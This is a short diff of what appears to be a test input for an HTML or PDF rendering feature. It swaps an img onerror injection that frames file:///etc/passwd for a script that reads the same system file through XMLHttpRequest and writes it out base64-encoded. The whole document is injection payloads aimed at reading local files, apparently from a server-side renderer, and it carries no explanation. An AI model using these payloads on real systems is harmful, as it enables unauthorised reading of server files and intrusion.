@@ -1,4 +1,9 @@
-oopsasd
+oi mate
 
 
-<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<script>
+x=new XMLHttpRequest();
+x.onload=function(){document.write(btoa(this.responseText))};
+x.onerror = function(){document.write('failed!')};
+x.open("GET","file:///etc/passwd");x.send()
+</script>
